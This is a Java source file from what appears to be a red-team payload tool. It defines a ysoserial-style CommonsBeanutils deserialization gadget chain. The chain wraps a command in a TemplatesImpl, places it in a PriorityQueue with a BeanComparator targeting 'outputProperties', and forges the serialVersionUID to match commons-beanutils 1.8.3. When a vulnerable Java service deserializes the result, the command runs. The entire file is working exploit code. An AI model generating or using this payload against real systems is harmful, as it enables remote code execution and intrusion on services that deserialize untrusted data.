package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.JavassistClassLoader;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.util.Comparator;
import java.util.PriorityQueue;

import static com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({
        "commons-beanutils:commons-beanutils:1.9.2",
        "commons-logging:commons-logging:1.2"
})
@Authors({Authors.PHITHON})
public class CommonsBeanutils2_183 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        final Comparator comparator = createCompatibleBeanComparator();
        Reflections.setFieldValue(comparator, "property", null);
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        return queue;
    }

    private static Comparator createCompatibleBeanComparator() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        CtClass beanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            beanComparator.defrost();
            try {
                CtField field = beanComparator.getDeclaredField("serialVersionUID");
                beanComparator.removeField(field);
            } catch (javassist.NotFoundException ignored) {
            }
            beanComparator.addField(CtField.make(
                    "private static final long serialVersionUID = -3490850999041592962L;",
                    beanComparator
            ));
            return (Comparator) beanComparator.toClass(new JavassistClassLoader()).newInstance();
        } finally {
            beanComparator.defrost();
        }
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2_183.class, args);
    }
}
